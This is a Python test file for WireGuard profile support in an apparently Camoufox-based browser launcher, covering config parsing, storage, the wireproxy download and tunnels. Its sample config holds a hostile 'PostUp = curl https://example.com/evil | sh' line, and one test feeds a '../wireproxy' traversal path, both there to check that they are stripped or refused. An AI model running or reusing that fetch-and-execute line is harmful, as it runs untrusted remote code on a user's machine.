"""WireGuard profiles: config parsing, storage, the wireproxy download and tunnels."""

import asyncio
import base64
import hashlib
import io
import os
import socket
import stat
import subprocess
import tarfile
import time

import pytest
from fastapi.testclient import TestClient

from src.api.app import create_app
from src.core.container import Container
from src.models.profile import Profile
from src.services.browser import launcher as launcher_mod
from src.services.browser import wireguard
from src.services.browser.launcher import BrowserLauncher


def _key(seed: int) -> str:
    return base64.b64encode(bytes([seed]) * 32).decode()


CONF = f"""# from the provider
[Interface]
PrivateKey = {_key(1)}
Address = 10.8.0.2/32, fd00::2/128
DNS = 1.1.1.1
MTU = 1280
ListenPort = 51820
PostUp = curl https://example.com/evil | sh

[Peer]
PublicKey = {_key(2)}
PresharedKey = {_key(3)}
AllowedIPs = 0.0.0.0/0, ::/0
Endpoint = 203.0.113.5:51820
PersistentKeepalive = 25

[Socks5]
BindAddress = 0.0.0.0:1080

[TCPServerTunnel]
ListenPort = 22
Target = 127.0.0.1:22
"""


@pytest.fixture
def workdir(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    return tmp_path


# --- config ----------------------------------------------------------------------------


def test_parse_keeps_only_wireguard_keys():
    config = wireguard.parse(CONF)
    assert config.endpoint == "203.0.113.5:51820"
    assert config.text.startswith("[Interface]\n")
    for gone in ("ListenPort", "PostUp", "Socks5", "BindAddress", "TCPServerTunnel", "Target"):
        assert gone not in config.text
    for kept in ("PrivateKey", "Address", "DNS", "MTU", "PresharedKey", "PersistentKeepalive"):
        assert kept in config.text
    # Normalised text parses to itself.
    assert wireguard.parse(config.text).text == config.text


@pytest.mark.parametrize(
    "change, message",
    [
        (lambda c: c.replace(_key(1), "not-a-key"), "PrivateKey"),
        (lambda c: c.replace("Endpoint = 203.0.113.5:51820", "Endpoint = 203.0.113.5"), "host"),
        (lambda c: c.replace("Endpoint = 203.0.113.5:51820\n", ""), "Endpoint"),
        (lambda c: c.replace("Address = 10.8.0.2/32, fd00::2/128", "Address = nope"), "address"),
        (lambda c: c.replace("DNS = 1.1.1.1", "DNS = dns.example"), "DNS"),
        (lambda c: c.split("[Peer]")[0], "Peer"),
        (lambda c: c.replace("[Interface]", "[Interface]\n[Interface]"), "Interface"),
        (lambda c: "PrivateKey = x\n" + c, "line"),
        (lambda c: c + "#" * wireguard.MAX_CONF_BYTES, "large"),
    ],
)
def test_parse_rejects_bad_configs(change, message):
    with pytest.raises(wireguard.WireGuardError, match=message):
        wireguard.parse(change(CONF))


@pytest.mark.parametrize(
    ("allowed", "everything"),
    [
        ("0.0.0.0/0, ::/0", True),
        ("0.0.0.0/0", True),
        ("::/0", True),
        ("0.0.0.0/1, 128.0.0.0/1", True),
        ("10.9.0.1/32", False),
        ("10.0.0.0/8, fd00::/8", False),
        ("0.0.0.0/1", False),
        ("198.51.100.0/24, 203.0.113.7/32", False),
    ],
)
def test_routes_everything_follows_allowed_ips(allowed, everything):
    conf = CONF.replace("AllowedIPs = 0.0.0.0/0, ::/0", f"AllowedIPs = {allowed}")
    assert wireguard.parse(conf).routes_everything is everything


def test_peers_without_allowed_ips_route_nothing():
    conf = CONF.replace("AllowedIPs = 0.0.0.0/0, ::/0\n", "")
    assert wireguard.parse(conf).routes_everything is False


def test_save_load_remove(workdir):
    folder = workdir / "camoufox_data" / "p"
    assert wireguard.save(str(folder), CONF) == "203.0.113.5:51820"
    path = folder / wireguard.CONF_NAME
    if os.name == "posix":
        assert stat.S_IMODE(path.stat().st_mode) == 0o600
    assert wireguard.load(str(folder)) == wireguard.parse(CONF).text
    wireguard.remove(str(folder))
    assert wireguard.load(str(folder)) is None
    wireguard.remove(str(folder))


# --- wireproxy download ----------------------------------------------------------------


def _release(member: str, data: bytes) -> bytes:
    out = io.BytesIO()
    with tarfile.open(fileobj=out, mode="w:gz") as archive:
        info = tarfile.TarInfo(member)
        info.size = len(data)
        archive.addfile(info, io.BytesIO(data))
    return out.getvalue()


def _serve(monkeypatch, blob: bytes, sha: str | None = None):
    asset = ("wireproxy_test.tar.gz", sha or hashlib.sha256(blob).hexdigest())
    monkeypatch.setattr(wireguard, "_asset", lambda: asset)
    urls = []

    def urlopen(url, timeout):
        urls.append(url)
        return io.BytesIO(blob)

    monkeypatch.setattr(wireguard.urllib.request, "urlopen", urlopen)
    return urls


def test_install_checks_the_sum_and_unpacks_only_the_binary(workdir, monkeypatch):
    monkeypatch.setattr(wireguard, "BIN_DIR", str(workdir / "bin"))
    name = wireguard.binary_path().name
    urls = _serve(monkeypatch, _release(name, b"#!binary"))
    said = []
    path = wireguard.install(said.append)
    assert path.read_bytes() == b"#!binary"
    assert urls == [
        f"https://github.com/windtf/wireproxy/releases/download/v{wireguard.VERSION}/"
        "wireproxy_test.tar.gz"
    ]
    assert wireguard.is_installed() and len(said) == 2
    # Installed: no second download.
    wireguard.install()
    assert len(urls) == 1


def test_install_refuses_a_changed_download(workdir, monkeypatch):
    monkeypatch.setattr(wireguard, "BIN_DIR", str(workdir / "bin"))
    _serve(monkeypatch, _release(wireguard.binary_path().name, b"evil"), sha="0" * 64)
    with pytest.raises(wireguard.WireGuardError, match="checksum"):
        wireguard.install()
    assert not wireguard.is_installed()


def test_install_refuses_an_archive_without_the_binary(workdir, monkeypatch):
    monkeypatch.setattr(wireguard, "BIN_DIR", str(workdir / "bin"))
    _serve(monkeypatch, _release("../wireproxy", b"x"))
    with pytest.raises(wireguard.WireGuardError, match="missing"):
        wireguard.install()


def test_assets_cover_the_team_platforms(monkeypatch):
    for plat, machine, asset in (
        ("linux", "x86_64", "wireproxy_linux_amd64.tar.gz"),
        ("linux", "aarch64", "wireproxy_linux_arm64.tar.gz"),
        ("win32", "AMD64", "wireproxy_windows_amd64.tar.gz"),
    ):
        monkeypatch.setattr(wireguard.sys, "platform", plat)
        monkeypatch.setattr(wireguard.platform, "machine", lambda m=machine: m)
        assert wireguard._asset()[0] == asset
    monkeypatch.setattr(wireguard.sys, "platform", "darwin")
    with pytest.raises(wireguard.WireGuardError):
        wireguard._asset()


# --- launcher --------------------------------------------------------------------------


class FakeTunnel:
    started: list = []
    stopped: list = []

    def __init__(self, conf_text):
        self.conf = conf_text
        self.proxy = None
        self.internal = not wireguard.parse(conf_text).routes_everything

    def start(self, log=None):
        self.proxy = "http://u:p@127.0.0.1:40000"
        FakeTunnel.started.append(self)
        return self.proxy

    def stop(self):
        FakeTunnel.stopped.append(self)


class FakeProc:
    def poll(self):
        return None


@pytest.fixture
def bl(workdir, monkeypatch):
    FakeTunnel.started, FakeTunnel.stopped = [], []
    spawned, launch_opts = [], []

    def spawn(profile, data_dir=None, proxy=None, **opts):
        spawned.append((profile.name, proxy))
        launch_opts.append(opts)
        return FakeProc()

    monkeypatch.setattr(launcher_mod, "spawn_browser", spawn)
    monkeypatch.setattr(launcher_mod, "wait_for_exit", lambda *a: None)
    monkeypatch.setattr(launcher_mod, "terminate", lambda *a, **k: None)
    monkeypatch.setattr(wireguard, "Tunnel", FakeTunnel)
    b = BrowserLauncher()
    monkeypatch.setattr(b, "_monitor_process", lambda *a: None)
    b.spawned = spawned
    b.launch_opts = launch_opts
    yield b
    b._active_sessions.clear()


def test_launch_goes_through_the_tunnel_and_stops_it(bl, workdir):
    wireguard.save(str(workdir / "camoufox_data" / "p"), CONF)
    profile = Profile(name="p", proxy="http://user:pass@198.51.100.20:8080", wireguard="x")
    assert bl.start_thread(profile, lambda m: None)
    assert bl.spawned == [("p", "http://u:p@127.0.0.1:40000")]
    with bl.wireguard_proxy("p") as proxy:
        assert proxy == "http://u:p@127.0.0.1:40000"
    assert len(FakeTunnel.started) == 1
    bl.stop_profile("p")
    assert FakeTunnel.stopped == FakeTunnel.started


def test_tunnel_without_internet_exit_is_passed_to_the_runner(bl, workdir):
    bl.launch_options = lambda: {"geo_guard": True}
    internal = CONF.replace("AllowedIPs = 0.0.0.0/0, ::/0", "AllowedIPs = 10.9.0.0/24")
    wireguard.save(str(workdir / "camoufox_data" / "p"), internal)
    wireguard.save(str(workdir / "camoufox_data" / "vpn"), CONF)
    bl.start_thread(Profile(name="p", wireguard="x"), lambda m: None)
    bl.start_thread(Profile(name="vpn", wireguard="x"), lambda m: None)
    bl.start_thread(Profile(name="plain"), lambda m: None)
    assert bl.launch_opts == [
        {"geo_guard": True, "internal_tunnel": True},
        {"geo_guard": True},
        {"geo_guard": True},
    ]


def test_launch_without_a_config_fails_cleanly(bl):
    stops = []
    assert bl.start_thread(
        Profile(name="p", wireguard="x"), lambda m: None, on_stop=lambda: stops.append(1)
    )
    assert bl.spawned == [] and stops == [1]
    assert not bl.is_running("p")


def test_profile_without_tunnel_keeps_its_proxy(bl):
    bl.start_thread(Profile(name="p", proxy="http://user:pass@198.51.100.20:8080"), lambda m: None)
    assert bl.spawned == [("p", None)]
    assert FakeTunnel.started == []


def test_check_ip_of_a_stopped_profile_opens_a_short_tunnel(bl, workdir):
    wireguard.save(str(workdir / "camoufox_data" / "p"), CONF)
    with bl.wireguard_proxy("p") as proxy:
        assert proxy.startswith("http://")
        assert FakeTunnel.stopped == []
    assert FakeTunnel.stopped == FakeTunnel.started
    with pytest.raises(wireguard.WireGuardError), bl.wireguard_proxy("other"):
        pass


# --- API -------------------------------------------------------------------------------


def test_api_sets_and_removes_a_tunnel_without_returning_it(workdir, monkeypatch):
    monkeypatch.setattr(wireguard, "prefetch", lambda log=None: False)
    client = TestClient(create_app(Container()), base_url="http://127.0.0.1")
    assert client.post("/api/v1/profiles", json={"name": "p"}).status_code == 201
    r = client.put("/api/v1/profiles/p/wireguard", json={"config": "nonsense"})
    assert r.status_code == 400
    r = client.put("/api/v1/profiles/p/wireguard", json={"config": CONF})
    assert r.status_code == 200, r.text
    assert r.json()["wireguard"] == "203.0.113.5:51820"
    listing = client.get("/api/v1/profiles").text
    assert _key(1) not in listing and _key(3) not in listing
    conf = workdir / "camoufox_data" / "p" / wireguard.CONF_NAME
    assert conf.exists()
    # A clone is a new device: it does not share the tunnel's key.
    r = client.post("/api/v1/profiles/p/clone", json={"name": "q"})
    assert r.status_code == 201 and r.json()["wireguard"] is None
    r = client.delete("/api/v1/profiles/p/wireguard")
    assert r.status_code == 200 and r.json()["wireguard"] is None
    assert not conf.exists()


# --- real wireproxy (skipped unless installed) -----------------------------------------


def _x25519() -> tuple[str, str]:
    from cryptography.hazmat.primitives import serialization as s
    from cryptography.hazmat.primitives.asymmetric.x25519 import X25519PrivateKey

    key = X25519PrivateKey.generate()
    private = key.private_bytes(s.Encoding.Raw, s.PrivateFormat.Raw, s.NoEncryption())
    public = key.public_key().public_bytes(s.Encoding.Raw, s.PublicFormat.Raw)
    return base64.b64encode(private).decode(), base64.b64encode(public).decode()


def _port(kind=socket.SOCK_STREAM) -> int:
    with socket.socket(socket.AF_INET, kind) as sock:
        sock.bind(("127.0.0.1", 0))
        return sock.getsockname()[1]


@pytest.fixture
def loopback_vpn(tmp_path):
    """A second wireproxy plays the VPN server and forwards one TCP port of a private
    network (AllowedIPs 10.9.0.1/32: no internet exit). Yields the client config and
    the URL of a page inside the tunnel."""
    import http.server
    import threading

    if not wireguard.is_installed():
        pytest.skip("wireproxy not downloaded")
    server_key, server_pub = _x25519()
    client_key, client_pub = _x25519()
    wg_port, inner_port = _port(socket.SOCK_DGRAM), 8080

    class Hello(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"through the tunnel")

        def log_message(self, *args):
            pass

    web = http.server.HTTPServer(("127.0.0.1", 0), Hello)
    threading.Thread(target=web.serve_forever, daemon=True).start()
    server_conf = tmp_path / "server.conf"
    server_conf.write_text(
        f"[Interface]\nPrivateKey = {server_key}\nAddress = 10.9.0.1/32\nListenPort = {wg_port}\n\n"
        f"[Peer]\nPublicKey = {client_pub}\nAllowedIPs = 10.9.0.2/32\n\n"
        f"[TCPServerTunnel]\nListenPort = {inner_port}\nTarget = 127.0.0.1:{web.server_port}\n"
    )
    server = subprocess.Popen([str(wireguard.binary_path()), "-s", "-c", str(server_conf)])
    client_conf = (
        f"[Interface]\nPrivateKey = {client_key}\nAddress = 10.9.0.2/32\n\n"
        f"[Peer]\nPublicKey = {server_pub}\nAllowedIPs = 10.9.0.1/32\n"
        f"Endpoint = 127.0.0.1:{wg_port}\n"
    )
    try:
        time.sleep(0.5)
        yield client_conf, f"http://10.9.0.1:{inner_port}/"
    finally:
        server.terminate()
        server.wait(5)
        web.shutdown()


def test_real_tunnel_over_loopback(loopback_vpn):
    import urllib.error
    import urllib.request

    client_conf, url = loopback_vpn
    with wireguard.tunnel(client_conf) as proxy:
        opener = urllib.request.build_opener(
            urllib.request.ProxyHandler({"http": proxy, "https": proxy})
        )
        body = opener.open(url, timeout=15).read()
        assert body == b"through the tunnel"
        # wireproxy wants a per-tunnel login; without it the proxy refuses.
        assert proxy.startswith("http://") and "@127.0.0.1:" in proxy
        bare = "http://" + proxy.split("@", 1)[1]
        no_login = urllib.request.build_opener(
            urllib.request.ProxyHandler({"http": bare, "https": bare})
        )
        with pytest.raises(urllib.error.HTTPError) as refused:
            no_login.open(url, timeout=15)
        assert refused.value.code == 407
    assert not any(p.name.startswith("wireproxy-") for p in _work_root().iterdir())


def _camoufox_fetched() -> bool:
    try:
        from camoufox.pkgman import installed_verstr

        return bool(installed_verstr())
    except Exception:
        return False


@pytest.mark.skipif(not _camoufox_fetched(), reason="Camoufox not fetched")
def test_real_camoufox_through_a_tunnel_without_internet(loopback_vpn, monkeypatch, tmp_path):
    import json

    from src.services.browser import launch_opts, runner

    client_conf, url = loopback_vpn
    assert not wireguard.parse(client_conf).routes_everything
    seen: dict = {}

    async def first_tabs(context, _profile_dir, _start_urls):
        page = context.pages[0]
        await page.goto(url)
        seen["body"] = await page.inner_text("body")
        seen["webrtc"] = await page.evaluate("typeof RTCPeerConnection")
        runner._shutdown.set()

    def no_lookup(*_):
        raise AssertionError("no exit IP lookup through an internal tunnel")

    monkeypatch.chdir(tmp_path)
    monkeypatch.setenv(launch_opts.ENV, json.dumps({"internal_tunnel": True}))
    monkeypatch.setattr(runner, "HEADLESS", True)
    monkeypatch.setattr(runner, "RESTORE_TABS", False)
    monkeypatch.setattr(runner, "open_first_tabs", first_tabs)
    monkeypatch.setattr(runner, "exit_ip", no_lookup)
    runner._shutdown.clear()
    try:
        with wireguard.tunnel(client_conf) as proxy:
            code = asyncio.run(
                asyncio.wait_for(
                    runner.run_browser("p", proxy, "linux", "Europe/Berlin", "de-DE"), 120
                )
            )
    finally:
        runner._shutdown.clear()
    assert code == 0
    assert seen["body"] == "through the tunnel"
    assert seen["webrtc"] == "undefined"


def _work_root():
    from src.services.security.profile_data import work_root

    return work_root()


# --- launching through a tunnel without an internet exit -------------------------------


def _fake_runner(monkeypatch, tmp_path, opts):
    import json

    from src.services.browser import launch_opts, runner

    seen = {}

    def camoufox(**config):
        seen.update(config)
        raise RuntimeError("stop after the launch options")

    def no_lookup(*_):
        raise AssertionError("no exit IP lookup through an internal tunnel")

    monkeypatch.chdir(tmp_path)
    monkeypatch.setenv(launch_opts.ENV, json.dumps(opts))
    monkeypatch.setattr(runner, "AsyncCamoufox", camoufox)
    monkeypatch.setattr(runner, "load_or_create", lambda *_: {})
    monkeypatch.setattr(runner, "exit_ip", no_lookup)
    monkeypatch.setattr(launch_opts, "geo_guard", no_lookup)
    return runner, seen


def test_internal_tunnel_launches_with_pinned_geo_and_no_webrtc(monkeypatch, tmp_path, capsys):
    runner, seen = _fake_runner(monkeypatch, tmp_path, {"internal_tunnel": True, "geo_guard": True})
    proxy = "http://127.0.0.1:40000"
    asyncio.run(runner.run_browser("p", proxy, "windows", "Europe/Berlin", "de-DE"))
    out = capsys.readouterr().out
    assert seen["block_webrtc"] is True
    assert "geoip" not in seen
    assert seen["config"] == {"timezone": "Europe/Berlin"} and seen["locale"] == "de-DE"
    assert 'GEO:{"ip": null, "country": null}' in out
    assert "Geo guard: skipped" in out
    assert "Exit IP: unknown" in out


@pytest.mark.parametrize(("timezone", "locale"), [("", ""), ("Europe/Berlin", ""), ("", "de-DE")])
def test_internal_tunnel_needs_pinned_timezone_and_language(
    monkeypatch, tmp_path, capsys, timezone, locale
):
    runner, seen = _fake_runner(monkeypatch, tmp_path, {"internal_tunnel": True})
    assert asyncio.run(runner.run_browser("p", "http://127.0.0.1:1", "windows", timezone, locale))
    out = capsys.readouterr().out
    assert "LAUNCH_FAILED: InternalTunnelError" in out and "pin both" in out
    assert seen == {}


def test_chrome_runner_skips_the_lookups_through_an_internal_tunnel(monkeypatch, tmp_path, capsys):
    import json

    from chrome_engine import runner as chrome_runner
    from src.services.browser import launch_opts

    engines = []

    class Engine:
        def __init__(self, profile_dir, **kwargs):
            self.kwargs = kwargs
            engines.append(self)

        async def start(self):
            raise RuntimeError("stop before the browser")

        async def stop(self):
            pass

    async def installed():
        pass

    def no_guard(*_):
        raise AssertionError("no geo guard through an internal tunnel")

    monkeypatch.chdir(tmp_path)
    monkeypatch.setenv(launch_opts.ENV, json.dumps({"internal_tunnel": True, "geo_guard": True}))
    monkeypatch.setattr(chrome_runner, "ChromeEngine", Engine)
    monkeypatch.setattr(chrome_runner, "ensure_installed", installed)
    monkeypatch.setattr(launch_opts, "geo_guard", no_guard)

    proxy = "http://127.0.0.1:40000"
    asyncio.run(chrome_runner.run_browser("p", proxy, "windows"))
    assert "LAUNCH_FAILED: InternalTunnelError" in capsys.readouterr().out

    asyncio.run(chrome_runner.run_browser("p", proxy, "windows", "Europe/Berlin", "de-DE"))
    out = capsys.readouterr().out
    assert "Geo guard: skipped" in out
    assert "LAUNCH_FAILED: RuntimeError: stop before the browser" in out
    assert engines[-1].kwargs["timezone"] == "Europe/Berlin"
